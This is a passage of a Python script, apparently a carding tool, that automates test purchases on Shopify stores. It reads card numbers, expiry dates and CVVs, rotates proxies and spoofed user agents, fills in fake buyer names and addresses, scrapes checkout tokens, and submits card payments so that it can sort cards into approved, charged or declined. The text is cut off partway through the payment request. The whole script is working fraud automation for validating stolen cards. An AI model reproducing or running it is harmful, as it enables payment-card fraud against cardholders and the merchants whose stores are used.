import asyncio
import httpx
import re
import random
import json
import os
from fake_useragent import UserAgent
from urllib.parse import urlparse, quote
import time
from collections import deque
from typing import List, Dict, Tuple, Optional
import aiofiles

# Global state for site rotation and stats
class ShopifyGlobalState:
    def __init__(self):
        self.available_sites = deque()
        self.unavailable_sites = []
        self.banned_sites = []  # PERMANENTLY banned - NEVER use again
        self.site_failures = {}  # Track why each site failed for accuracy
        self.proxies = deque()
        self.active_proxies = []
        self.dead_proxies = []
        self.stats = {
            'total_checks': 0,
            'approved': 0,
            'charged': 0,
            'declined': 0,
            'errors': 0,
            'retries': 0,
            'start_time': time.time(),
            'last_card': None,
            'last_result': None,
            'last_price': None,
            'current_site': None,
            'current_proxy': None,
            'proxy_status': 'No Proxy'
        }
        self.site_responses = {}
        self.lock = asyncio.Lock()
        self.load_config()

    def load_config(self):
        """Load saved configuration"""
        try:
            if os.path.exists('shopify_config.json'):
                with open('shopify_config.json', 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.available_sites = deque(data.get('available_sites', []))
                    self.unavailable_sites = data.get('unavailable_sites', [])
                    self.banned_sites = data.get('banned_sites', [])
                    self.site_failures = data.get('site_failures', {})
                    self.proxies = deque(data.get('proxies', []))
                    self.active_proxies = data.get('active_proxies', [])
                    self.dead_proxies = data.get('dead_proxies', [])
        except:
            pass

    def save_config(self):
        """Save configuration to file"""
        try:
            with open('shopify_config.json', 'w', encoding='utf-8') as f:
                json.dump({
                    'available_sites': list(self.available_sites),
                    'unavailable_sites': self.unavailable_sites,
                    'banned_sites': self.banned_sites,
                    'site_failures': self.site_failures,
                    'proxies': list(self.proxies),
                    'active_proxies': self.active_proxies,
                    'dead_proxies': self.dead_proxies
                }, f, indent=2)
        except:
            pass

    def get_next_site(self):
        """Get next available site with rotation - skip banned sites"""
        if not self.available_sites:
            return None

        # Skip banned sites completely
        while self.available_sites:
            site = self.available_sites[0]
            if site not in self.banned_sites:
                self.available_sites.rotate(-1)
                self.stats['current_site'] = site
                return site
            else:
                # Remove banned site from rotation permanently
                self.available_sites.popleft()
        
        return None

    def get_next_proxy(self):
        """Get next available proxy from ACTIVE proxies only"""
        # Only use active proxies - don't fallback to all proxies
        if not self.active_proxies:
            self.stats['current_proxy'] = None
            self.stats['proxy_status'] = 'No Proxy'
            return None

        proxy = self.active_proxies[0]
        self.active_proxies.pop(0)
        self.active_proxies.append(proxy)
        self.stats['current_proxy'] = proxy
        self.stats['proxy_status'] = 'Alive ✅'
        return proxy

    def ban_site_permanently(self, site, reason=""):
        """PERMANENTLY BAN a site - NEVER use again"""
        if site in self.available_sites:
            self.available_sites.remove(site)
        if site not in self.banned_sites:
            self.banned_sites.append(site)
        # Track why site was banned
        if site not in self.site_failures:
            self.site_failures[site] = []
        self.site_failures[site].append(reason)
        self.save_config()
        print(f"   🚫 PERMANENTLY BANNED: {site} (Reason: {reason})")
    
    def mark_site_unavailable(self, site):
        """Mark a site as unavailable (legacy - now calls ban_site_permanently)"""
        self.ban_site_permanently(site, "Response validation failed")

    def mark_site_available(self, site):
        """Mark a site as available"""
        if site in self.unavailable_sites:
            self.unavailable_sites.remove(site)
        if site not in self.available_sites:
            self.available_sites.append(site)
        self.save_config()

    def add_sites(self, sites: List[str]):
        """Add multiple sites to rotation"""
        for site in sites:
            if site and site not in self.available_sites:
                self.available_sites.append(site)
        self.save_config()

    def add_proxies(self, proxies: List[str]):
        """Add multiple proxies to rotation"""
        for proxy in proxies:
            if proxy and proxy not in self.proxies:
                self.proxies.append(proxy)
        self.save_config()

    def update_stats(self, result_type: str, card: str | None = None, price: str | None = None):
        """Update statistics"""
        self.stats['total_checks'] += 1
        if result_type == 'approved':
            self.stats['approved'] += 1
        elif result_type == 'charged':
            self.stats['charged'] += 1
        elif result_type == 'declined':
            self.stats['declined'] += 1
        elif result_type == 'error':
            self.stats['errors'] += 1
        elif result_type == 'retry':
            self.stats['retries'] += 1

        if card:
            self.stats['last_card'] = card
        if price:
            self.stats['last_price'] = price

# Global state instance
GLOBAL_STATE = ShopifyGlobalState()

def parse_proxy(proxy_str):
    """
    Convert various proxy formats to httpx-compatible format.

    Supported formats:
    1. Standard: http://user:pass@host:port
    2. BrightData: https://host:port:user:pass or host:port:user:pass
    3. Simple: http://host:port or host:port

    Returns httpx-compatible proxy URL.
    """
    if not proxy_str:
        return None

    proxy_str = proxy_str.strip()

    # Already in standard format with @ sign
    if '@' in proxy_str:
        # Ensure it has a scheme
        if not proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy_str = 'http://' + proxy_str
        return proxy_str

    # Remove protocol prefix for parsing
    original_scheme = 'http'
    clean_proxy = proxy_str
    if proxy_str.startswith('https://'):
        original_scheme = 'http'  # Use http for the actual proxy connection
        clean_proxy = proxy_str[8:]
    elif proxy_str.startswith('http://'):
        clean_proxy = proxy_str[7:]
    elif proxy_str.startswith('socks5://'):
        original_scheme = 'socks5'
        clean_proxy = proxy_str[9:]
    elif proxy_str.startswith('socks4://'):
        original_scheme = 'socks4'
        clean_proxy = proxy_str[9:]

    parts = clean_proxy.split(':')

    if len(parts) == 2:
        # Simple format: host:port
        host, port = parts
        return f"{original_scheme}://{host}:{port}"

    elif len(parts) == 4:
        # BrightData format: host:port:user:pass
        host, port, user, password = parts
        # URL encode username and password in case they have special characters
        user_encoded = quote(user, safe='')
        pass_encoded = quote(password, safe='')
        return f"{original_scheme}://{user_encoded}:{pass_encoded}@{host}:{port}"

    elif len(parts) > 4:
        # Complex BrightData format where username or password contains colons
        # Format: host:port:user-with-possible-colons:password
        # The username typically starts with 'brd-customer-' pattern
        host = parts[0]
        port = parts[1]

        # Find where the password starts (last part after the last colon)
        # In BrightData, password is typically the last segment
        password = parts[-1]

        # Everything between port and password is the username
        user = ':'.join(parts[2:-1])

        # URL encode username and password
        user_encoded = quote(user, safe='')
        pass_encoded = quote(password, safe='')
        return f"{original_scheme}://{user_encoded}:{pass_encoded}@{host}:{port}"

    # Couldn't parse, return as-is with scheme
    if not proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return f"http://{proxy_str}"
    return proxy_str

def find_between(s, start, end):
    try:
        return (s.split(start))[1].split(end)[0]
    except:
        return ""

class ShopifyAuto:
    def __init__(self):
        self.ua = UserAgent()
        self.last_price = None

    async def get_random_info(self, session):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]

        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"

        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)

        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

    async def extract_tokens_from_checkout(self, checkout_text):
        """COMPREHENSIVE token extraction using ALL methods from working scripts"""
        tokens = {}
        
        print("🔍 Comprehensive token extraction...")
        
        session_patterns = [
            'serialized-session-token" content="&quot;', '&quot;"',
            'session-token" content="', '"',
            '"sessionToken":"', '"',
            "'sessionToken':'", "'",
            'data-session-token="', '"'
        ]
        
        for i in range(0, len(session_patterns), 2):
            tokens['x_checkout_one_session_token'] = find_between(checkout_text, session_patterns[i], session_patterns[i+1])
            if tokens['x_checkout_one_session_token'] and len(tokens['x_checkout_one_session_token']) > 20:
                break

        tokens['queue_token'] = ""
        
        queue_token = find_between(checkout_text, '&quot;queueToken&quot;:&quot;', '&quot;')
        if queue_token and len(queue_token) > 10 and " " not in queue_token:
            tokens['queue_token'] = queue_token
            print("✅ Queue token found via sh.py method")
        
        if not tokens['queue_token']:
            queue_token = find_between(checkout_text, '"queueToken":"', '"')
            if queue_token and len(queue_token) > 10 and " " not in queue_token:
                tokens['queue_token'] = queue_token
                print("✅ Queue token found via JSON method")
        
        if not tokens['queue_token']:
            queue_token = find_between(checkout_text, "'queueToken':'", "'")
            if queue_token and len(queue_token) > 10 and " " not in queue_token:
                tokens['queue_token'] = queue_token
                print("✅ Queue token found via single quotes method")
        
        if not tokens['queue_token']:
            js_patterns = [
                r'window\.checkout.*?queueToken.*?["\']([^"\']+)["\']',
                r'checkout.*?queueToken.*?["\']([^"\']+)["\']',
                r'queueToken\s*=\s*["\']([^"\']+)["\']',
                r'"queue_token"\s*:\s*"([^"]+)"'
            ]
            for pattern in js_patterns:
                matches = re.findall(pattern, checkout_text, re.DOTALL)
                if matches and len(matches[0]) > 10 and " " not in matches[0]:
                    tokens['queue_token'] = matches[0]
                    print(f"✅ Queue token found via JS pattern: {pattern[:50]}...")
                    break
        
        if not tokens['queue_token']:
            script_patterns = [
                r'<script[^>]*>.*?window\.checkout\s*=\s*({[^}]+}).*?</script>',
                r'<script[^>]*>.*?checkout\s*=\s*({[^}]+}).*?</script>',
                r'window\.ShopifyCheckout\s*=\s*({[^<]+})'
            ]
            for pattern in script_patterns:
                matches = re.findall(pattern, checkout_text, re.DOTALL)
                for match in matches:
                    try:
                        json_str = match.replace("&quot;", '"')
                        data = json.loads(json_str)
                        if 'queueToken' in data:
                            tokens['queue_token'] = data['queueToken']
                            print("✅ Queue token found in script JSON")
                            break
                    except:
                        queue_match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', match)
                        if queue_match:
                            tokens['queue_token'] = queue_match.group(1)
                            print("✅ Queue token found in script string")
                            break
                if tokens['queue_token']:
                    break
        
        if not tokens['queue_token']:
            data_attrs = [
                'data-queue-token="', '"',
                'data-checkout-queue-token="', '"'
            ]
            for i in range(0, len(data_attrs), 2):
                queue_token = find_between(checkout_text, data_attrs[i], data_attrs[i+1])
                if queue_token and len(queue_token) > 10 and " " not in queue_token:
                    tokens['queue_token'] = queue_token
                    print("✅ Queue token found via data attribute")
                    break

        tokens['stable_id'] = find_between(checkout_text, 'stableId&quot;:&quot;', '&quot;')
        if not tokens['stable_id']:
            tokens['stable_id'] = find_between(checkout_text, '"stableId":"', '"')
        if not tokens['stable_id']:
            stable_matches = re.findall(r'"stableId"\s*:\s*"([^"]+)"', checkout_text)
            if stable_matches:
                tokens['stable_id'] = stable_matches[0]
        
        tokens['paymentMethodIdentifier'] = find_between(checkout_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        if not tokens['paymentMethodIdentifier']:
            tokens['paymentMethodIdentifier'] = find_between(checkout_text, '"paymentMethodIdentifier":"', '"')
        if not tokens['paymentMethodIdentifier']:
            payment_matches = re.findall(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
            if payment_matches:
                tokens['paymentMethodIdentifier'] = payment_matches[0]

        tokens['updated_total'] = ""
        total_patterns = [
            r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*"([^"]+)"',
            r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*(\d+)',
            r'"total"\s*:\s*"([^"]+)"',
            r'"totalPrice"\s*:\s*"([^"]+)"',
            r'data-total-price="([^"]+)"',
            r'total_price["\s:]+([\d]+)',
        ]
        
        for pattern in total_patterns:
            matches = re.findall(pattern, checkout_text)
            if matches:
                for match in matches:
                    if match and match.isdigit() and len(match) > 2:
                        tokens['updated_total'] = match
                        print(f"✅ Updated total found: ${int(match)/100:.2f}")
                        break
                if tokens['updated_total']:
                    break
        
        if not tokens['updated_total']:
            try:
                checkout_data_match = re.search(r'window\.checkout\s*=\s*({[^}]+})', checkout_text)
                if checkout_data_match:
                    checkout_json = json.loads(checkout_data_match.group(1).replace("&quot;", '"'))
                    if 'totalPrice' in checkout_json:
                        tokens['updated_total'] = str(checkout_json['totalPrice'])
                        print(f"✅ Updated total from JSON: ${int(tokens['updated_total'])/100:.2f}")
            except:
                pass

        if not tokens['queue_token']:
            print("🔍 Performing deep queue token search...")
            uuid_patterns = [
                r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}',
                r'[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}',
            ]
            
            all_uuids = []
            for pattern in uuid_patterns:
                matches = re.findall(pattern, checkout_text)
                all_uuids.extend(matches)
            
            filtered_uuids = [uid for uid in all_uuids if uid != tokens.get('x_checkout_one_session_token', '') and uid != tokens.get('stable_id', '')]
            
            if filtered_uuids:
                from collections import Counter
                uuid_counts = Counter(filtered_uuids)
                most_common = uuid_counts.most_common(1)
                if most_common:
                    tokens['queue_token'] = most_common[0][0]
                    print(f"✅ Queue token found via UUID pattern: {tokens['queue_token'][:20]}...")

        return tokens

    async def get_product_info(self, session, site_url):
        """Get CHEAPEST available product from ALL products with pagination"""
        all_variants = []

        print("🔍 Scanning ALL products to find cheapest option...")

        urls_to_try = [
            f"{site_url}/products.json",
            f"{site_url}/collections/all/products.json"
        ]

        for base_url in urls_to_try:
            try:
                print(f"🔍 Trying endpoint: {base_url}")
                page = 1
                max_pages = 10
                consecutive_empty = 0
                endpoint_variants = 0

                while page <= max_pages:
                    url = f"{base_url}?page={page}&limit=250"
                    try:
                        response = await session.get(url)
                        if response.status_code != 200:
                            print(f"⚠️ Page {page} returned {response.status_code} at {base_url}")
                            break

                        data = response.json()
                        products = data.get('products', [])

                        if not products or len(products) == 0:
                            consecutive_empty += 1
                            if consecutive_empty >= 2:
                                print(f"✅ Reached end of products (2 consecutive empty pages)")
                                break
                            page += 1
                            continue

                        consecutive_empty = 0

                        for product in products:
                            product_title = product.get('title', 'Product')
                            variants = product.get('variants', [])

                            for variant in variants:
                                if variant.get('available', False):
                                    try:
                                        price = variant.get('price', '1.00')
                                        if price and str(price).strip():
                                            price_float = float(price)
                                            price_cents = int(price_float * 100)
                                        else:
                                            price_cents = 100

                                        all_variants.append({
                                            'id': str(variant['id']),
                                            'title': product_title,
                                            'price': str(price_cents),
                                            'available': True,
                                            'price_value': price_cents
                                        })
                                        endpoint_variants += 1
                                    except (ValueError, TypeError):
                                        pass

                        if len(products) < 250:
                            print(f"✅ Page {page} returned {len(products)} products (last page)")
                            break

                        page += 1
                    except Exception as e:
                        print(f"⚠️ Error on page {page}: {e}, continuing...")
                        page += 1
                        continue

                if endpoint_variants > 0:
                    print(f"✅ Found {endpoint_variants} variants from {base_url}")
                else:
                    print(f"⚠️ No variants found at {base_url}")

            except Exception as e:
                print(f"⚠️ {base_url} failed: {e}, trying next endpoint...")
                continue

        if all_variants:
            all_variants.sort(key=lambda x: x['price_value'])
            cheapest = all_variants[0]
            del cheapest['price_value']

            price_dollars = float(cheapest['price']) / 100
            print(f"✅ Found cheapest product: {cheapest['title']} - ${price_dollars:.2f}")
            print(f"   (Scanned {len(all_variants)} available variants from all endpoints)")

            return cheapest

        print("⚠️ No products found from any source, using fallback")
        return {
            'id': '39555780771934',
            'title': 'Default Product',
            'price': '100',
            'available': True
        }

    async def test_site_shopify(self, site_url: str, proxy: str | None = None) -> Tuple[bool, str, str]:
        """Test if a site is a working Shopify site"""
        try:
            client_kwargs = {
                'timeout': 15.0,
                'follow_redirects': True,
                'headers': {'User-Agent': self.ua.random},
                'verify': False,
                'trust_env': False
            }

            if proxy:
                parsed_proxy = parse_proxy(proxy)
                if parsed_proxy:
                    client_kwargs['proxy'] = parsed_proxy

            async with httpx.AsyncClient(**client_kwargs) as session:
                # Try to access Shopify-specific endpoints
                endpoints = [
                    f"{site_url}/products.json",
                    f"{site_url}/collections/all/products.json",
                    f"{site_url}/cart.js"
                ]

                for endpoint in endpoints:
                    try:
                        response = await session.get(endpoint)
                        if response.status_code == 200:
                            data = response.json()

                            if 'products' in data or 'token' in data:
                                # Get product info
                                product_info = await self.get_product_info(session, site_url)
                                price_dollars = float(product_info['price']) / 100

                                return True, f"${price_dollars:.2f}", product_info['title']
                    except:
                        continue

                return False, "N/A", "Not Shopify"

        except Exception as e:
            return False, f"Error: {str(e)}", "Failed"

    async def auto_shopify_charge(self, site_url, card_info, proxy=None, max_retries=3):
        """Main function with COMPREHENSIVE token extraction"""
        # Parse card data
        try:
            card_parts = card_info.split('|')
            cc = card_parts[0]
            mes = card_parts[1]
            ano = card_parts[2]
            cvv = card_parts[3]

            # PRE-VALIDATION: Check for expired cards
            from datetime import datetime
            now = datetime.now()
            exp_year = int(ano)
            if exp_year < 100: exp_year += 2000 # Handle 2-digit years
            exp_month = int(mes)
            
            if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                print(f"   ⚠️ Skipping card {cc[:4]}... - Already expired ({mes}/{ano})")
                return f"❌ Card DECLINED - Expired Card (Pre-validated: {mes}/{ano})"
        except Exception as e:
            return f"❌ Error parsing card data: {str(e)}"

        cc1 = cc[:4]
        cc2 = cc[4:8]
        cc3 = cc[8:12]
        cc4 = cc[12:]

        action_required_3ds = False

        print(f"🚀 Starting process on: {site_url}")
        print(f"💳 Card: {cc1} {cc2} {cc3} {cc4}")
        if proxy:
            print(f"🔌 Using proxy: {proxy[:30]}...")

        client_kwargs = {
            'timeout': 30.0,
            'follow_redirects': True,
            'headers': {'User-Agent': self.ua.random},
            'verify': False,
            'trust_env': False
        }

        if proxy:
            parsed_proxy = parse_proxy(proxy)
            if parsed_proxy:
                client_kwargs['proxy'] = parsed_proxy
                print(f"🔌 Parsed proxy: {parsed_proxy[:50]}...")

        async with httpx.AsyncClient(**client_kwargs) as session:

            try:
                print("\n📦 STEP 1: Finding product...")
                product_info = await self.get_product_info(session, site_url)
                if not product_info:
                    return "❌ No products found on this site"

                try:
                    price_dollars = float(product_info['price']) / 100
                    print(f"✅ Product: {product_info['title']} - ${price_dollars:.2f}")
                except (ValueError, TypeError):
                    print(f"✅ Product: {product_info['title']} - Price: {product_info['price']}")

                print("\n🛒 STEP 2: Adding to cart...")
                url = f"{site_url}/cart/add.js"

                headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': site_url,
                    'referer': f"{site_url}/collections/all",
                    'user-agent': self.ua.random,
                    'x-requested-with': 'XMLHttpRequest'
                }

                form_data = {'id': product_info['id'], 'quantity': 1}
                response = await session.post(url, data=form_data, headers=headers)

                if response.status_code not in [200, 201]:
                    print(f"⚠️ First add to cart attempt failed: {response.status_code}")

                    print("🔄 Trying alternative method (form POST)...")
                    url_alt = f"{site_url}/cart/add"
                    headers_alt = {
                        'authority': urlparse(site_url).netloc,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': site_url,
                        'referer': f"{site_url}/products/{product_info['id']}",
                        'user-agent': self.ua.random,
                    }

                    form_data_alt = {
                        'form_type': 'product',
                        'utf8': '✓',
                        'id': product_info['id'],
                        'quantity': '1'
                    }

                    response = await session.post(url_alt, data=form_data_alt, headers=headers_alt, follow_redirects=True)

                    if response.status_code not in [200, 201, 302, 303]:
                        return f"❌ Failed to add to cart (both methods): {response.status_code}"

                print(f"✅ Add to cart: {response.status_code}")

                print("\n🔑 STEP 3: Getting cart token and total...")
                url = f"{site_url}/cart.js"
                headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': '*/*',
                    'referer': f"{site_url}/cart",
                    'user-agent': self.ua.random,
                }

                response = await session.get(url, headers=headers)
                if response.status_code == 200:
                    cart_data = response.json()
                    token = cart_data.get("token")
                    cart_total = cart_data.get("total_price")

                    if token:
                        print(f"✅ Cart token: {token[:20]}...")
                    else:
                        return "❌ Failed to get cart token"

                    if cart_total is not None:
                        cart_total_cents = int(cart_total)
                        product_info['price'] = str(cart_total_cents)

                        try:
                            total_dollars = cart_total_cents / 100
                            print(f"✅ Cart total: ${total_dollars:.2f}")
                            print(f"   (Raw cart value: {cart_total_cents} cents)")
                        except (ValueError, TypeError):
                            print(f"✅ Cart total: {cart_total}")
                    else:
                        print("⚠️ Could not get cart total, using product price")
                else:
                    return f"❌ Failed to get cart data: {response.status_code}"

                print("\n➡️ STEP 4: Processing checkout...")
                checkout_url = f"{site_url}/checkout"
                headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'referer': f"{site_url}/cart",
                    'user-agent': self.ua.random,
                }

                response = await session.get(checkout_url, headers=headers, follow_redirects=True)
                if response.status_code != 200:
                    return f"❌ Failed to access checkout: {response.status_code}"

                checkout_text = response.text

                tokens = await self.extract_tokens_from_checkout(checkout_text)

                print(f"✅ Session token: {tokens['x_checkout_one_session_token'][:20]}..." if tokens['x_checkout_one_session_token'] and len(tokens['x_checkout_one_session_token']) > 10 else "❌ Session token: INVALID")
                print(f"✅ Queue token: {tokens['queue_token'][:20]}..." if tokens['queue_token'] and len(tokens['queue_token']) > 10 else "❌ Queue token: INVALID")
                print(f"✅ Stable ID: {tokens['stable_id']}" if tokens['stable_id'] else "❌ Stable ID: MISSING")
                print(f"✅ Payment Method ID: {tokens['paymentMethodIdentifier']}" if tokens['paymentMethodIdentifier'] else "❌ Payment Method ID: MISSING")

                final_price = tokens.get('updated_total') or product_info['price']

                if not final_price or (isinstance(final_price, str) and not final_price.strip()):
                    final_price = product_info['price']

                try:
                    final_price_dollars = float(final_price) / 100
                    print(f"💰 Final price to charge: ${final_price_dollars:.2f}")
                except (ValueError, TypeError):
                    print(f"💰 Final price to charge: {final_price} cents")
                    try:
                        final_price = str(int(float(final_price or "100")))
                    except:
                        final_price = product_info['price']

                self.last_price = final_price

                missing_tokens = []
                if not tokens['x_checkout_one_session_token'] or len(tokens['x_checkout_one_session_token']) < 10:
                    missing_tokens.append('x_checkout_one_session_token')
                if not tokens['queue_token'] or len(tokens['queue_token']) < 10:
                    missing_tokens.append('queue_token')
                if not tokens['stable_id']:
                    missing_tokens.append('stable_id')
                if not tokens['paymentMethodIdentifier']:
                    missing_tokens.append('paymentMethodIdentifier')

                if missing_tokens:
                    return f"❌ Missing valid tokens: {', '.join(missing_tokens)}"

                await asyncio.sleep(1)

                print("\n💳 STEP 5: Creating payment session...")
                random_data = await self.get_random_info(session)
                fname = random_data["fname"]
                lname = random_data["lname"]
                email = random_data["email"]
                phone = random_data["phone"]
                add1 = random_data["add1"]
                city = random_data["city"]
                state_short = random_data["state_short"]
                zip_code = str(random_data["zip"])

                print(f"📍 Using address: {add1}, {city}, {state_short} {zip_code}")
                print(f"📞 Using phone: {phone}")

                url = "https://deposit.us.shopifycs.com/sessions"
                headers = {
                    'authority': 'deposit.us.shopifycs.com',
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://checkout.shopifycs.com',
                    'referer': 'https://checkout.shopifycs.com/',
                    'user-agent': self.ua.random,
                }

                json_data = {
                    'credit_card': {
                        'number': cc,
                        'month': mes,
                        'year': ano,
                        'verification_value': cvv,
                        'name': fname + ' ' + lname,
                    },
                    'payment_session_scope': urlparse(site_url).netloc,
                }

                response = await session.post(url, headers=headers, json=json_data)
                print(f"📡 Payment Session Response Status: {response.status_code}")

                if response.status_code != 200:
                    return f"⚠️ Error - Payment session failed (Status: {response.status_code})\nCannot verify card - site/network issue"

                session_data = response.json()
                print(f"📡 Payment Session Response: {json.dumps(session_data, indent=2)}")

                if "id" not in session_data:
                    if session_data.get("error") or session_data.get("errors"):
                        error_info = session_data.get("error") or session_data.get("errors")
                        return f"❌ Card DECLINED\nReason: {error_info}"
                    return f"⚠️ Error - No session ID returned\nResponse: {json.dumps(session_data, indent=2)[:500]}"

                sessionid = session_data["id"]

                if session_data.get("error") or session_data.get("errors"):
                    error_info = session_data.get("error") or session_data.get("errors")
                    return f"❌ Card DECLINED!\nReason: {error_info}"

                if session_data.get("status") == "failed" or session_data.get("state") == "failed":
                    return f"❌ Card DECLINED!\nSession status: {session_data.get('status') or session_data.get('state')}"

                print(f"✅ Payment session created: {sessionid}")
                print(f"✅ Card passed initial validation!")

                await asyncio.sleep(1)

                print("\n📡 STEP 6: Submitting GraphQL payment...")
                graphql_url = f"{site_url}/checkouts/unstable/graphql"

                graphql_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'pragma': 'no-cache',
                    'referer': f"{site_url}/",
                    'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': self.ua.random,
                    'x-checkout-one-session-token': tokens['x_checkout_one_session_token'],
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-source-id': token,
                }

                price_amount = str(float(final_price) / 100) if final_price else "1.00"

                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {
                                'sessionToken': tokens['x_checkout_one_session_token'],
                            },
                            'queueToken': tokens['queue_token'],
                            'discounts': {
                                'lines': [],
                                'acceptUnexpectedDiscounts': True,
                            },
                            'delivery': {
                                'deliveryLines': [
                                    {
                                        'selectedDeliveryStrategy': {
                                            'deliveryStrategyMatchingConditions': {
                                                'estimatedTimeInTransit': {
                                                    'any': True,
                                                },
                                                'shipments': {
                                                    'any': True,
                                                },
                                            },
                                            'options': {},
                                        },
                                        'targetMerchandiseLines': {
                                            'lines': [
                                                {
                                                    'stableId': tokens['stable_id'],
                                                },
                                            ],
                                        },
                                        'destination': {
                                            'streetAddress': {
                                                'address1': add1,
                                                'address2': '',
                                                'city': city,
                                                'countryCode': 'US',
                                                'postalCode': zip_code,
                                                'company': '',
                                                'firstName': fname,
                                                'lastName': lname,
                                                'zoneCode': state_short,
                                                'phone': phone,
                                            },
                                        },
                                        'deliveryMethodTypes': [
                                            'SHIPPING',
                                        ],
                                        'expectedTotalPrice': {
                                            'any': True,
                                        },
                                        'destinationChanged': True,
                                    },
                                ],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [
                                    {
                                        'stableId': tokens['stable_id'],
                                        'merchandise': {
                                            'productVariantReference': {
                                                'id': f'gid://shopify/ProductVariantMerchandise/{product_info["id"]}',
                                                'variantId': f'gid://shopify/ProductVariant/{product_info["id"]}',
                                                'properties': [],
                                                'sellingPlanId': None,
                                                'sellingPlanDigest': None,
                                            },
                                        },
                                        'quantity': {
                                            'items': {
                                                'value': 1,
                                            },
                                        },
                                        'expectedTotalPrice': {
                                            'any': True,
                                        },
                                        'lineComponentsSource': None,
                                        'lineComponents': [],
                                    },
                                ],
                            },
                            'payment': {
                                'totalAmount': {
                                    'any': True,
                                },
                                'paymentLines': [
                                    {
                                        'paymentMethod': {
                                            'directPaymentMethod': {
                                                'paymentMethodIdentifier': tokens['paymentMethodIdentifier'],
                                                'sessionId': sessionid,
                                                'billingAddress': {
                                                    'streetAddress': {
                                                        'address1': add1,
                                                        'address2': '',
                                                        'city': city,
                                                        'countryCode': 'US',
                                                        'postalCode': zip_code,
                                                        'company': '',
                                                        'firstName': fname,
                                                        'lastName': lname,
                                                        'zoneCode': state_short,
                                                        'phone': phone,
                                                    },
                                                },
                                                'cardSource': None,
                                            },
                                            'giftCardPaymentMethod': None,
                                            'redeemablePaymentMethod': None,
                                            'walletPaymentMethod': None,
                                            'walletsPlatformPaymentMethod': None,
                                            'localPaymentMethod': None,
                                            'paymentOnDeliveryMethod': None,
                                            'paymentOnDeliveryMethod2': None,
                                            'manualPaymentMethod': None,
                                            'customPaymentMethod': None,
                                            'offsitePaymentMethod': None,
